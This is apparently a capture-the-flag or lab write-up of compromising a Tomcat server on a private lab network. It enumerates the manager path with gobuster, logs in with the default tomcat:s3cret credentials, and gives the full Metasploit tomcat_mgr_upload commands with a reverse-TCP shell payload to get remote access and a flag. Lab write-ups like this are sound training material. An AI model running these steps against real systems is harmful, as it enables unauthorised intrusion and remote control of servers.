Going to port 8080 returns default apache site, so lets gobuster

`gobuster dir -u http://172.16.64.101:8080 -w /opt/SecLists/Discovery/Web-Content/ApacheTomcat.fuzz.txt -r`

We find the default location of manager but get a 401 unauthorized, if we hit this in a browser we are presented with the usual 401 error
![unauthorized](unauthorized.png)

Knowing this is Tomcat, metasploit has a module to exploit an authenticated upload. But can we authenticate? Testing `tomcat:s3cret` does infact work for us on this machine. Fire up msfconsole and enter:  
``  
`` for linux x86 which we know from nmap
```
use exploit/multi/http/tomcat_mgr_upload
set TARGET 2
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword s3cret
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 172.16.64.101
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 8080
msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST 172.16.64.10
msf6 exploit(multi/http/tomcat_mgr_upload) > set Payload linux/x86/shell/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit
```

We set the target to 2 because from nmap we know the machine is Linux based. After a moment we get out session.

At this point we can cd to /home and do an ls to see a `developer` folder we can access, going into here we see our flag.txt *`(this is different from the .182 machine because we're on the .101 box)`*
